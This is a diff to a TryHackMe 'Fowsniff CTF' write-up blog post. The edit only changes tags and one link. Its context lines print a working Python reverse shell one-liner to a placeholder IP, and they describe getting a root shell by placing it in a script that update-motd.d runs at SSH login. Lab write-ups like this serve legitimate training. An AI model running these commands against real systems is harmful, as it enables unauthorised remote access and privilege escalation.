@@ -1,8 +1,8 @@
 ---
 title:  "THM: Fowsniff CTF"
 date:   2024-03-31 19:00:00 +0000
-categories: [Windows]
-tags: [Windows]
+categories: [CTF]
+tags: [CTF]
 ---
 
 ![img](/assets/img/ctf-fowsniff.png)  
@@ -54,7 +54,7 @@ Python Reverse Shell:
 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-Other reverse shells: [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
+Other reverse shells: [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 
 12. If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
